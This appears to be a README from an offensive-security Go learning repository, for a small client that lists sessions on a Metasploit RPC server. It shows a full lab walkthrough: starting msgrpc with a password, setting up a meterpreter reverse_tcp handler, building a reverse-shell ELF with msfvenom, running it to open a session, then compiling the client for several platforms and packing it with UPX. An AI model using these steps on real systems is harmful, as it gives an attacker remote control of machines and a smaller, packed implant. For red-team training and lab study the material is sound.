# client

## Help Menu
```
./client -h
2024/02/06 15:48:31 Missing required environment variable MSFHOST or MSFPASS

```

## metasploit client example
```
Metasploit Server
msf6 > load msgrpc ServerHost=0.0.0.0 Pass=badpasswordlol
[*] MSGRPC Service:  0.0.0.0:55552 
[*] MSGRPC Username: msf
[*] MSGRPC Password: badpasswordlol
[*] Successfully loaded plugin: msgrpc
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD linux/x64/meterpreter/reverse_tcp
PAYLOAD => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.1.11
LHOST => 192.168.1.11
msf6 exploit(multi/handler) > exploit

Exploit some client
└─$ msfvenom -a x64 -platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.20.122 LPORT=4444 -f elf -o yolo.elf
└─$ chmod 755 yolo.elf
└─$ ./yolo.elf

Metasploit Server
[*] Started reverse TCP handler on 192.168.1.11:4444 
[*] Sending stage (3045380 bytes) to 192.168.1.11
[*] Meterpreter session 1 opened (192.168.1.11:4444 -> 192.168.1.11:41056) at 2024-02-06 15:50:49 -0700

meterpreter > 


Client
$ MSFHOST=192.168.1.11:55552 MSFPASS=badpasswordlol ./client 
Active Sessions:
    1 kali @ kali.kali
```

# Build Environments

## Windows
```
~/blackhat-go/metasploit-minimal/client$ env GOOS=windows GOARCH=amd64 go build

~/blackhat-go/metasploit-minimal/client$ file client
client: PE32+ executable (console) x86-64, for MS Windows
```

## Linux
```
# static binary, no linked libraries
~/blackhat-go/metasploit-minimal/client$ CGO_ENABLED=0 go build

~/blackhat-go/metasploit-minimal/client$ file client 
client: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=P83-EZpwXiaTx8UEc6km/1fJtGaHFhIhYy31U2CdL/3ELf7H_vRHE-k5kN61Q3/n8xRjKrQJmLfPMAJ-JsY, with debug_info, not stripped

~/blackhat-go/metasploit-minimal/client$ ldd client
        not a dynamic executable
```

## OSX
```
~/blackhat-go/metasploit-minimal/client$ env GOOS=darwin GOARCH=amd64 go build

~/blackhat-go/metasploit-minimal/client$ file client
client: Mach-O 64-bit x86_64 executable
```

## Compression

* Golang binaries are beefy bois. We can try to trim them down a bit.

``` 
~/blackhat-go/metasploit-minimal/client$ ls -alh client 
-rwxrwxr-x 1 someuser somegroup 2.9M Dec 20 12:25 client

~/blackhat-go/metasploit-minimal/client$ upx-ucl -9 client 
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2020
UPX 3.96        Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
   3040256 ->   1830400   60.21%    win64/pe     client               

Packed 1 file.

~/blackhat-go/metasploit-minimal/client$ ls -alh client 
-rwxrwxr-x 1 someuser somegroup 1.8M Dec 20 12:25 client
```
